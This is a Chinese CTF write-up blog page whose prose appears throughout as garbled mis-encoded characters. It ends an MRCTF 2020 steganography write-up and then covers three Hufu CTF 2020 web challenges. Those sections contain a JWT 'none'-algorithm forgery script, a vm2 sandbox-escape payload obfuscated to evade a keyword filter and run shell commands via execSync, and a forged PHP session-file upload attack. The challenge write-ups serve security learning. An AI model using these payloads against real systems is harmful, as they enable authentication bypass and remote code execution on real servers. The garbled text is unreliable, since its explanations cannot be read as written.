<p>ç”¨StegSolveå›¾ç‰‡ä¸­åˆ†ç¦»å‡ºä¸€å¼ å›¾ç‰‡å¾—åˆ°å¯†ç ï¼š</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200422/15875597586078.png" alt="img"></p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200422/15875598279919.png" alt="img"></p>
<p>è§£å‹å‡ºæ¥æ˜¯TTL.ç”¨è„šæœ¬è½¬æ¢ä¸ºå­—ç¬¦</p>
<pre><code class="python">import re

txt = open(&quot;out.txt&quot;,&#39;r&#39;)
line = txt.readlines()
number = []
flag = &quot;&quot;
for i in line:
    number.append(int(i))
for i in number:
    if(i == 63):
        flag += &quot;00&quot;
    elif(i == 127):
        flag += &quot;01&quot;
    elif(i == 191):
        flag += &quot;10&quot;
    else:
        flag += &quot;11&quot;
strr = re.findall(r&#39;.{8}&#39;, flag)
for i in strr:
    print(chr(int(i,2)),end=&quot;&quot;)</code></pre>
<p>å¾—åˆ°å¯†ç <code>0ac1fe6b77be5dbe</code> å‹ç¼©åŒ…é‡Œé¢å†å¾—åˆ°ä¸€ä¸ªwordï¼Œæ–‡å­—å…¨éƒ¨å˜æˆé»‘è‰²å¾—åˆ°ï¼š</p>
<pre><code>MTEwMTEwMTExMTExMTEwMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTEwMDAwMDAxMTExMTExMTExMDAxMTAx
MTEwMTEwMTEwMDAxMTAxMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTExMTExMTExMTExMTEwMTEwMDEx
MTEwMDAwMTAxMTEwMTExMDExMTEwMTExMTExMTAwMDExMTExMTExMTExMDAxMDAxMTAxMTEwMDAwMDExMTExMDAwMDExMTExMTEx
MTEwMTEwMTAwMDAxMTExMDExMTEwMTExMTExMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTExMTExMTAwMTEwMTExMTExMTExMTEx
MTEwMTEwMTAxMTExMTExMDExMTEwMTExMTAxMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTAxMTExMTAwMTEwMTExMTExMTExMTEx
MTEwMTEwMTAwMDAxMTAwMDAwMTEwMDAwMDAxMTAwMDExMTAwMDAwMTEwMTEwMTEwMTAxMTEwMDAwMDAxMTExMDAwMDExMTExMTEx</code></pre><p>base64éšå†™ï¼Œç”¨<a href="https://github.com/jerrita/b64steg" target="_blank" rel="noopener">b64steg</a>è§£å¯†</p>
<pre><code>b64steg.py -f stego.txt -s out.txt</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20200422/1587560232982.png" alt="img"></p>
<h2 id="MRCTF2020-æ‘‡æ»šDJ"><a href="#MRCTF2020-æ‘‡æ»šDJ" class="headerlink" title="[MRCTF2020]æ‘‡æ»šDJ"></a>[MRCTF2020]æ‘‡æ»šDJ</h2><p><a href="https://apktrending.com/apk-android/xdsopl-robot36.html" target="_blank" rel="noopener">Robot36 - SSTV Image Decoder</a> ç›´æ¥AFSK1200æ— çº¿ç”µè§£ç ã€‚<br><img src="http://goodcheerleung.gitee.io/mycute/20200422/15875614783837.png" alt="img"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d5702afe7e.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="éšç¬”ã€åˆ†äº«ã€è®°å½•ç”Ÿæ´»">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d5702afe7e.html" class="post-title-link" itemprop="url">è™ç¬¦ CTF 2020 Write up</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2020-04-20 12:27:54" itemprop="dateCreated datePublished" datetime="2020-04-20T12:27:54+08:00">2020-04-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2020-10-14 17:15:06" itemprop="dateModified" datetime="2020-10-14T17:15:06+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTFæ¯”èµ›/" itemprop="url" rel="index"><span itemprop="name">CTFæ¯”èµ›</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>13k</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
              <span>11 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="easy-login"><a href="#easy-login" class="headerlink" title="easy_login"></a>easy_login</h1><p><code>/static/js/app.js</code>ä¸­æœ‰hintæç¤ºè¿™ä¸ªwebä½¿ç”¨<code>koa-static æ¥å¤„ç†é™æ€æ–‡ä»¶</code></p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200420/15873489757041.png" alt="img"></p>
<p>çŒœæµ‹å­˜åœ¨koaè·¯ç”±é…ç½®é”™è¯¯å¯¼è‡´æ ¹ç›®å½•çš„ä»»æ„æ–‡ä»¶è¯»å–ã€‚æˆ‘ä»¬ç›´æ¥è¯»å–app.jpg</p>
<pre><code class="http">http://dafd014be0114c23bd9aa2e1a84d01ea772d377a8e974ab5.changame.ichunqiu.com/app.js</code></pre>
<pre><code class="javascript">const Koa = require(&#39;koa&#39;);
const bodyParser = require(&#39;koa-bodyparser&#39;);
const session = require(&#39;koa-session&#39;);
const static = require(&#39;koa-static&#39;);
const views = require(&#39;koa-views&#39;);

const crypto = require(&#39;crypto&#39;);
const { resolve } = require(&#39;path&#39;);

const rest = require(&#39;./rest&#39;);
const controller = require(&#39;./controller&#39;);

const PORT = 80;
const app = new Koa();

app.keys = [crypto.randomBytes(16).toString(&#39;hex&#39;)];
global.secrets = [];

app.use(static(resolve(__dirname, &#39;.&#39;)));

app.use(views(resolve(__dirname, &#39;./views&#39;), {
  extension: &#39;pug&#39;
}));

app.use(session({key: &#39;sses:aok&#39;, maxAge: 86400000}, app));

// parse request body:
app.use(bodyParser());

// prepare restful service
app.use(rest.restify());

// add controllers:
app.use(controller());

app.listen(PORT);
console.log(`app started at port ${PORT}...`);
</code></pre>
<p>æ ¹æ®ä»£ç æˆ‘ä»¬çŸ¥é“è¿˜æœ‰<code>rest.js</code>å’Œ<code>controller.js</code></p>
<pre><code class="javascript">module.exports = {
    APIError: function (code, message) {
        this.code = code || &#39;internal:unknown_error&#39;;
        this.message = message || &#39;&#39;;
    },
    restify: () =&gt; {
        const pathPrefix = &#39;/api/&#39;;
        return async (ctx, next) =&gt; {
            if (ctx.request.path.startsWith(pathPrefix)) {
                ctx.rest = data =&gt; {
                    ctx.response.type = &#39;application/json&#39;;
                    ctx.response.body = data;
                };
                try {
                    await next();
                } catch (e) {
                    ctx.response.status = 400;
                    ctx.response.type = &#39;application/json&#39;;
                    ctx.response.body = {
                        code: e.code || &#39;internal_error&#39;,
                        message: e.message || &#39;&#39;
                    };
                }
            } else {
                await next();
            }
        };
    }
};
</code></pre>
<pre><code class="javascript">const fs = require(&#39;fs&#39;);

function addMapping(router, mapping) {
    for (const url in mapping) {
        if (url.startsWith(&#39;GET &#39;)) {
            const path = url.substring(4);
            router.get(path, mapping[url]);
        } else if (url.startsWith(&#39;POST &#39;)) {
            const path = url.substring(5);
            router.post(path, mapping[url]);
        } else {
            console.log(`invalid URL: ${url}`);
        }
    }
}

function addControllers(router, dir) {
    fs.readdirSync(__dirname + &#39;/&#39; + dir).filter(f =&gt; {
        return f.endsWith(&#39;.js&#39;);
    }).forEach(f =&gt; {
        const mapping = require(__dirname + &#39;/&#39; + dir + &#39;/&#39; + f);
        addMapping(router, mapping);
    });
}

module.exports = (dir) =&gt; {
    const controllers_dir = dir || &#39;controllers&#39;;
    const router = require(&#39;koa-router&#39;)();
    addControllers(router, controllers_dir);
    return router.routes();
};
</code></pre>
<p>å¯ä»¥çœ‹åˆ°<code>controllers</code>åº”è¯¥è¿˜è¿˜å­˜åœ¨<code>api.js</code></p>
<pre><code class="javascript">const crypto = require(&#39;crypto&#39;);
const fs = require(&#39;fs&#39;)
const jwt = require(&#39;jsonwebtoken&#39;)

const APIError = require(&#39;../rest&#39;).APIError;

module.exports = {
    &#39;POST /api/register&#39;: async (ctx, next) =&gt; {
        const {username, password} = ctx.request.body;

        if(!username || username === &#39;admin&#39;){
            throw new APIError(&#39;register error&#39;, &#39;wrong username&#39;);
        }

        if(global.secrets.length &gt; 100000) {
            global.secrets = [];
        }

        const secret = crypto.randomBytes(18).toString(&#39;hex&#39;);
        const secretid = global.secrets.length;
        global.secrets.push(secret)

        const token = jwt.sign({secretid, username, password}, secret, {algorithm: &#39;HS256&#39;});

        ctx.rest({
            token: token
        });

        await next();
    },

    &#39;POST /api/login&#39;: async (ctx, next) =&gt; {
        const {username, password} = ctx.request.body;

        if(!username || !password) {
            throw new APIError(&#39;login error&#39;, &#39;username or password is necessary&#39;);
        }

        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;

        const sid = JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid;

        console.log(sid)

        if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) {
            throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);
        }

        const secret = global.secrets[sid];

        const user = jwt.verify(token, secret, {algorithm: &#39;HS256&#39;});

        const status = username === user.username &amp;&amp; password === user.password;

        if(status) {
            ctx.session.username = username;
        }

        ctx.rest({
            status
        });

        await next();
    },

    &#39;GET /api/flag&#39;: async (ctx, next) =&gt; {
        if(ctx.session.username !== &#39;admin&#39;){
            throw new APIError(&#39;permission error&#39;, &#39;permission denied&#39;);
        }

        const flag = fs.readFileSync(&#39;/flag&#39;).toString();
        ctx.rest({
            flag
        });

        await next();
    },

    &#39;GET /api/logout&#39;: async (ctx, next) =&gt; {
        ctx.session.username = null;
        ctx.rest({
            status: true
        })
        await next();
    }
};
</code></pre>
<p>è¿™é“é¢˜å…¶å®æ˜¯åŸé¢˜ï¼Œjwtä¼ªé€ é—®é¢˜å’Œ[AngstromCTF 2019]Cookie Cutterä¸€æ ·ã€‚</p>
<p>é¦–å…ˆæˆ‘ä»¬æ¥äº†è§£ä¸€ä¸‹JWTçš„æ„æˆï¼š</p>
<p>JWTä¾‹å­ï¼š</p>
<pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInBhc3N3b3JkIjoiYWRtaW4iLCJyb2xsZWQiOiJubyIsImlhdCI6MTU4NzM1MTY0MX0.ljkr86K_y88GP8_9RBzxB2H8CBEK73tNdfDQwmT2eaY</code></pre><p>å…¶å®å®ƒæ˜¯ä»¥ç‚¹ä¸ºç•Œåˆ†ä¸ºä¸‰éƒ¨åˆ†ã€‚</p>
<pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</code></pre><pre><code>eyJzZWNyZXRpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInBhc3N3b3JkIjoiYWRtaW4iLCJyb2xsZWQiOiJubyIsImlhdCI6MTU4NzM1MTY0MX0</code></pre><pre><code>ljkr86K_y88GP8_9RBzxB2H8CBEK73tNdfDQwmT2eaY</code></pre><p>ç¬¬ä¸€éƒ¨åˆ†æˆ‘ä»¬æˆä¸ºå¤´éƒ¨ã€ç¬¬äºŒéƒ¨åˆ†æˆ‘ä»¬ç§°ä¸ºpayload,ç¬¬äºŒéƒ¨åˆ†æˆ‘ä»¬ç§°ä¹‹ä¸ºç­¾è¯ã€‚</p>
<ul>
<li>å¤´éƒ¨æ„æˆä¸»è¦ç”±ä¸¤éƒ¨åˆ†ï¼Œtypå£°æ˜ç±»å‹ï¼Œalgå£°æ˜åŠ å¯†ç±»å‹ï¼Œæœ€åbase64ç¼–ç ï¼š</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200420/15873521703081.png" alt="img"></p>
<ul>
<li>payload</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200420/15873528037874.png" alt="img"></p>
<ul>
<li>ç­¾è¯ç”±ä¸‰éƒ¨åˆ†ç»„æˆ<ul>
<li>å¤´ï¼ˆheaderï¼‰basee64</li>
<li>payload  base64</li>
<li>secret</li>
</ul>
</li>
<li>ç­¾è¯æ‹¿åˆ°ä¸Šè¿°ä¸œè¥¿åé€šè¿‡headerä¸­åŠ å¯†æ–¹å¼åŠ ç›çš„æ–¹å¼åŠ å¯†å½¢æˆäº†ç­¾è¯ã€‚</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200420/15873532192819.png" alt="img"></p>
<p>äº†è§£JWTçš„ç»„æˆåï¼Œæˆ‘ä»¬æ€»ç»“JWTå¯èƒ½å­˜åœ¨å¦‚ä¸‹çš„å®‰å…¨é—®é¢˜ï¼š</p>
<blockquote>
<p>1.ä¿®æ”¹å¤´ä»€ä¹ˆçš„ç®—æ³•ä¸ºnone</p>
<p>2.è‹¥secretè¾ƒçŸ­å¯ä»¥ç›´æ¥ä½¿ç”¨<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">c-jwt-cracker</a></p>
<p>3.ç§˜é’¥æ³„éœ²</p>
<p>3.ä¿®æ”¹ç®—æ³•RS256ä¸ºHS256</p>
</blockquote>
<p>åœ¨è¿™é“é¢˜ä¸­æ˜æ˜¾æ˜¯ä¿®æ”¹ç®—æ³•ä¸ºnoneè¿›è¡Œç»•è¿‡</p>
<p>æ„é€ jwtç¼–å†™è„šæœ¬</p>
<pre><code class="javascript">
const crypto = require(&#39;crypto&#39;);
const jwt = require(&#39;jsonwebtoken&#39;);

secretid=0.5;
username=&quot;admin&quot;;
password=&quot;admin&quot;;
rolled=&quot;no&quot;
const secret = crypto.randomBytes(18).toString(&#39;hex&#39;);
const token = jwt.sign({secretid, username, password,rolled}, secret, {algorithm: &#39;none&#39;});
console.log(token);
const sid = JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString());
console.log(sid)
</code></pre>
<p>è¿™é‡Œç»•è¿‡éœ€è¦æœ‰ä¸€ä¸ªå°trickï¼Œå…ˆæ³¨å†Œä¸€ä¸ªè´¦å·ç„¶åå†æäº¤ä¸Šé¢ç”Ÿæˆçš„JWTã€‚SIDç»•è¿‡å¯ä»¥æ˜¯â€â€æˆ–è€…å¤§äºé›¶å°äº1çš„æ•°ã€‚è¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ã€‚</p>
<p>â€‹        é¦–å…ˆè¦ç»•è¿‡<code>sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0</code>jå°±ä¸èƒ½è®©<code>global.secrets</code>è¿™ä¸ªæ•°ç»„ä¸º<code>undefined</code>ï¼Œæˆ‘ä»¬éœ€è¦æ³¨å†Œä¸€ä¸ªè´¦å·æ˜¯çš„å…¶åˆå§‹åŒ–ã€‚</p>
<p>â€‹        å…¶æ¬¡ä¸ºä»€ä¹ˆå°äº1å¤§äºé›¶0å‘¢ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ª<code>global.secrets</code>çš„å€¼ä¸ºnull,ä½†æ˜¯å¦‚æœæ˜¯0çš„è¯å°±æ˜¯æˆ‘ä»¬æ³¨å†Œé‚£ä¸ªäº†ï¼Œè¿™æ ·çš„è¯å°±ä¼šæç¤ºéœ€è¦ç­¾åï¼Œå¦‚æœæ˜¯å¤§äº1å°äºé›¶æ­£å¥½å¯ä»¥ç»•è¿‡ç¬¬ä¸€å±‚æ£€æµ‹å¹¶ä¸”ä½¿å¾—å€¼ä¸ºnullã€‚å½“ç„¶å¦‚æœä½ æ³¨å†Œçš„è´¦å·å¤Ÿå¤šå¤§äº1ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚è¿˜æœ‰å°±æ˜¯å¯ä»¥ä½¿ç”¨ç©ºå­—ç¬¦ä¸²è¿›è¡Œç»•è¿‡ï¼Œç©ºæ•°ç»„ä¹Ÿè¡Œï¼Œå› ä¸ºnodejsä¸­å¼±ç±»å‹æ¯”è¾ƒçš„å…³ç³»è¿™ä¸ªä¼šåœ¨ä¸‹ä¸€ä¸ªæ–‡ç« ä¸­é‡ç‚¹ç ”ç©¶ã€‚</p>
<p>æœ€ç»ˆè·å¾—flag:</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200420/15873550195855.png" alt="img"></p>
<h1 id="just-escape"><a href="#just-escape" class="headerlink" title="just_escape"></a>just_escape</h1><p>åŸé¢˜nodejsæ²™ç®±é€ƒé€¸ï¼Œä½†æ˜¯å¯¹è®¸å¤šå‡½æ•°è¿›è¡Œäº†è¿‡æ»¤ã€‚</p>
<p>å’Œé¢˜ä¸­ä¸€ä¸ªæ“ä½œåœ¨issueä¸­ä¸€æ ·æˆ‘ä»¬æ‰¾æœ€æ–°çš„ç‰ˆæœ¬çš„<a href="https://github.com/patriksimek/vm2/issues/225ã€‚" target="_blank" rel="noopener">exp</a>æ¥æµ‹è¯•ã€‚</p>
<pre><code>(function(){
    TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();
    try{
        Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;
    }catch(e){
        return e.get_process(()=&gt;{}).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();
    }
})()</code></pre><p>ä½†æ˜¯è‡ªå·±æ‰“è¿›å»ä¼šå‘ç°æ˜¯ä¸è¡Œçš„ã€‚æˆ‘ä»¬å¯ä»¥fuzzè¿™ä¸ªpayloadæœ‰å“ªäº›å†…å®¹æ˜¯è¢«è¿‡æ»¤çš„ã€‚process, exec, eval, constructor, prototype, Function, åŠ å·, åŒå¼•å·, å•å¼•å·è¢«è¿‡æ»¤.è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings" target="_blank" rel="noopener">æ¨¡æ¿å­—ç¬¦ä¸²</a>è¿›è¡Œç»•è¿‡ï¼Œè€Œå±æ€§å¯ä»¥ç”¨[æ¨¡æ¿å­—ç¬¦ä¸²]ä»£æ›¿ï¼Œè€Œå•å¼•å·åŒå¼•å·å¯ä»¥ç”¨åå¼•å·ä»£æ›¿ã€‚</p>
<pre><code>`${`${`return proces`}s`}`</code></pre><p>æœ€åä¿®æ”¹å¾—ï¼š</p>
<pre><code class="javascript">(function(){
       TypeError[`${`${`prototyp`}e`}`][`${`${`get_proces`}s`}`] = f=&gt;f[`${`${`constructo`}r`}`](`${`${`return this.proces`}s`}`)();
    try{
         Object.preventExtensions(Buffer.from(``)).a = 1;
    }catch(e){
        return e[`${`${`get_proces`}s`}`](()=&gt;{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`whoami`).toString();
    }
})()</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200420/15873745251856.png" alt="img"></p>
<h1 id="BabyUpload"><a href="#BabyUpload" class="headerlink" title="BabyUpload"></a>BabyUpload</h1><p>é¢˜ç›®ç›´æ¥ç»™äº†æºç ï¼š</p>
<pre><code class="php"> &lt;?php
error_reporting(0);
session_save_path(&quot;/var/babyctf/&quot;);
session_start();
require_once &quot;/flag&quot;;
highlight_file(__FILE__);
if($_SESSION[&#39;username&#39;] ===&#39;admin&#39;)
{
    $filename=&#39;/var/babyctf/success.txt&#39;;
    if(file_exists($filename)){
            safe_delete($filename);
            die($flag);
    }
}
else{
    $_SESSION[&#39;username&#39;] =&#39;guest&#39;;
}
$direction = filter_input(INPUT_POST, &#39;direction&#39;);
$attr = filter_input(INPUT_POST, &#39;attr&#39;);
$dir_path = &quot;/var/babyctf/&quot;.$attr;
if($attr===&quot;private&quot;){
    $dir_path .= &quot;/&quot;.$_SESSION[&#39;username&#39;];
}
if($direction === &quot;upload&quot;){
    try{
        if(!is_uploaded_file($_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;])){
            throw new RuntimeException(&#39;invalid upload&#39;);
        }
        $file_path = $dir_path.&quot;/&quot;.$_FILES[&#39;up_file&#39;][&#39;name&#39;];
        $file_path .= &quot;_&quot;.hash_file(&quot;sha256&quot;,$_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;]);
        if(preg_match(&#39;/(\.\.\/|\.\.\\\\)/&#39;, $file_path)){
            throw new RuntimeException(&#39;invalid file path&#39;);
        }
        @mkdir($dir_path, 0700, TRUE);
        if(move_uploaded_file($_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;],$file_path)){
            $upload_result = &quot;uploaded&quot;;
        }else{
            throw new RuntimeException(&#39;error while saving&#39;);
        }
    } catch (RuntimeException $e) {
        $upload_result = $e-&gt;getMessage();
    }
} elseif ($direction === &quot;download&quot;) {
    try{
        $filename = basename(filter_input(INPUT_POST, &#39;filename&#39;));
        $file_path = $dir_path.&quot;/&quot;.$filename;
        if(preg_match(&#39;/(\.\.\/|\.\.\\\\)/&#39;, $file_path)){
            throw new RuntimeException(&#39;invalid file path&#39;);
        }
        if(!file_exists($file_path)) {
            throw new RuntimeException(&#39;file not exist&#39;);
        }
        header(&#39;Content-Type: application/force-download&#39;);
        header(&#39;Content-Length: &#39;.filesize($file_path));
        header(&#39;Content-Disposition: attachment; filename=&quot;&#39;.substr($filename, 0, -65).&#39;&quot;&#39;);
        if(readfile($file_path)){
            $download_result = &quot;downloaded&quot;;
        }else{
            throw new RuntimeException(&#39;error while saving&#39;);
        }
    } catch (RuntimeException $e) {
        $download_result = $e-&gt;getMessage();
    }
    exit;
}
?&gt;</code></pre>
<p>æˆ‘ä»¬ç›´æ¥æ¥çœ‹å¦‚ä½•èƒ½æ‹¿åˆ°flagï¼›ä»£ç ä¸­å¯ä»¥çœ‹åˆ°ï¼Œé¦–å…ˆæˆ‘ä»¬<code>session</code>å¿…é¡»å¾—æ˜¯<code>admin</code>å…¶æ¬¡å¿…é¡»å­˜åœ¨success.txt</p>
<pre><code class="php">if($_SESSION[&#39;username&#39;] ===&#39;admin&#39;)
{
    $filename=&#39;/var/babyctf/success.txt&#39;;
    if(file_exists($filename)){
            safe_delete($filename);
            die($flag);
    }
}
else{
    $_SESSION[&#39;username&#39;] =&#39;guest&#39;;
}</code></pre>
<p>æˆ‘ä»¬å†çœ‹ç¬¬äºŒéƒ¨åˆ†ä¸Šä¼ çš„ä»£ç ,è¿™é‡Œæœ‰å››ä¸ªé‡è¦å‚æ•°ï¼Œ</p>
<ul>
<li><p><code>direction=upload</code></p>
</li>
<li><p><code>attr</code> å¯ä»¥å¯¹ä¸Šä¼ è·¯å¾„äº§ç”Ÿå½±å“</p>
</li>
<li><p>ä¸Šä¼ çš„ fieldæ˜¯up_file</p>
</li>
<li><p>æœ€åä¸€ç‚¹æ˜¯ä¸Šä¼ æ–‡ä»¶åä¼šæ‹¼æ¥ä¸Šæ–‡ä»¶å†…å®¹æœ¬èº«çš„sha256ï¼Œå³</p>
</li>
</ul>
<blockquote>
<p>$file_path .= â€œ_â€.hash_file(â€œsha256â€,$_FILES[â€˜up_fileâ€™][â€˜tmp_nameâ€™]);</p>
</blockquote>
<p>åŒæ—¶è¿™é‡Œå·²ç»é”æ­»ç›®å½•åœ¨<code>/var/babyctf/</code>,ä»£ç å·²ç»å¯¹ç›®å½•æ˜¯å¦ç©¿è¶Šè¿›è¡Œäº†æ£€æŸ¥ã€‚è€Œè¿™ä¸ªä¸Šä¼ çš„ç›®å½•æ­£å¥½åˆæ˜¯æˆ‘ä»¬sessionçš„å­˜å‚¨ä½ç½®ä»£ç å¼€å¤´å°±è®¾ç½®äº†sessionå­˜å‚¨ç›®å½•</p>
<blockquote>
<p>session_save_path(â€œ/var/babyctf/â€œ);</p>
</blockquote>
<p>é‚£æˆ‘ä»¬èƒ½ä¸èƒ½ä¸Šä¼ ä¸€ä¸ªsessionå¯¹sessionè¿›è¡Œä¿®æ”¹å‘¢ï¼Ÿæˆ‘ä»¬çœ‹ä»–ä¼šå°†æ–‡ä»¶æœ¬èº«çš„åå­—æ‹¼æ¥<code>_sha256(file)</code>,é‚£ä¹ˆæˆ‘ä»¬è®¡ç®—å‡ºè¿™ä¸ªsha256æŠŠä¸Šä¼ æ–‡ä»¶åæ”¹ä¸ºsessä¸å°±å˜æˆä¸€ä¸ªsessionæ–‡ä»¶äº†ã€‚æˆ‘ä»¬å†ä¿®æ”¹cookieå°±èƒ½è¾¾åˆ°getflagçš„ç›®çš„ã€‚</p>
<pre><code class="php">$direction = filter_input(INPUT_POST, &#39;direction&#39;);
$attr = filter_input(INPUT_POST, &#39;attr&#39;);
$dir_path = &quot;/var/babyctf/&quot;.$attr;
if($attr===&quot;private&quot;){
    $dir_path .= &quot;/&quot;.$_SESSION[&#39;username&#39;];
}
if($direction === &quot;upload&quot;){
    try{
        if(!is_uploaded_file($_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;])){
            throw new RuntimeException(&#39;invalid upload&#39;);
        }
        $file_path = $dir_path.&quot;/&quot;.$_FILES[&#39;up_file&#39;][&#39;name&#39;];
        $file_path .= &quot;_&quot;.hash_file(&quot;sha256&quot;,$_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;]);
        if(preg_match(&#39;/(\.\.\/|\.\.\\\\)/&#39;, $file_path)){
            throw new RuntimeException(&#39;invalid file path&#39;);
        }
        @mkdir($dir_path, 0700, TRUE);
        if(move_uploaded_file($_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;],$file_path)){
            $upload_result = &quot;uploaded&quot;;
        }else{
            throw new RuntimeException(&#39;error while saving&#39;);
        }
    } catch (RuntimeException $e) {
        $upload_result = $e-&gt;getMessage();
    }
}</code></pre>
<p>æˆ‘ä»¬å†çœ‹æœ€åä¸€éƒ¨åˆ†ä¸‹è½½çš„ä»£ç ,è¿™æ®µä»£ç å¾ˆç®€å•ï¼Œç›´æ¥direction=downloadå¹¶ä¸”postä¸€ä¸ªfilenameä¸Šå»å°±èƒ½ä¸‹è½½ã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è¯»å–å½“å‰sessionçœ‹çœ‹è¿™ä¸ªsessionæ˜¯ä»€ä¹ˆç±»å‹ã€‚</p>
<pre><code class="php"> elseif ($direction === &quot;download&quot;) {
    try{
        $filename = basename(filter_input(INPUT_POST, &#39;filename&#39;));
        $file_path = $dir_path.&quot;/&quot;.$filename;
        if(preg_match(&#39;/(\.\.\/|\.\.\\\\)/&#39;, $file_path)){
            throw new RuntimeException(&#39;invalid file path&#39;);
        }
        if(!file_exists($file_path)) {
            throw new RuntimeException(&#39;file not exist&#39;);
        }
        header(&#39;Content-Type: application/force-download&#39;);
        header(&#39;Content-Length: &#39;.filesize($file_path));
        header(&#39;Content-Disposition: attachment; filename=&quot;&#39;.substr($filename, 0, -65).&#39;&quot;&#39;);
        if(readfile($file_path)){
            $download_result = &quot;downloaded&quot;;
        }else{
            throw new RuntimeException(&#39;error while saving&#39;);
        }
    } catch (RuntimeException $e) {
        $download_result = $e-&gt;getMessage();
    }
    exit;
}</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¸ªsessionæ˜¯php_binaryç±»å‹</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200421/15874019524378.png" alt="img"></p>
<table>
<thead>
<tr>
<th>å¤„ç†å™¨åç§°</th>
<th>å­˜å‚¨æ ¼å¼</th>
</tr>
</thead>
<tbody><tr>
<td>php</td>
<td>é”®å + ç«–çº¿ + ç»è¿‡<code>serialize()</code>å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</td>
</tr>
<tr>
<td>php_binary</td>
<td>é”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦ + é”®å + ç»è¿‡<code>serialize()</code>å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</td>
</tr>
<tr>
<td>php_serialize</td>
<td>ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„<strong>æ•°ç»„</strong></td>
</tr>
</tbody></table>
<p>é‚£ä¹ˆæˆ‘ä»¬æ®æ­¤ç”Ÿæˆä¸€ä¸ªsessionæ–‡ä»¶</p>
<pre><code class="php">&lt;?php

ini_set(&#39;session.serialize_handler&#39;, &#39;php_binary&#39;);
session_save_path(&quot;C:\\Users\\51763\\Desktop\\&quot;);
session_start();

$_SESSION[&#39;username&#39;] = &#39;admin&#39;;
?&gt;</code></pre>
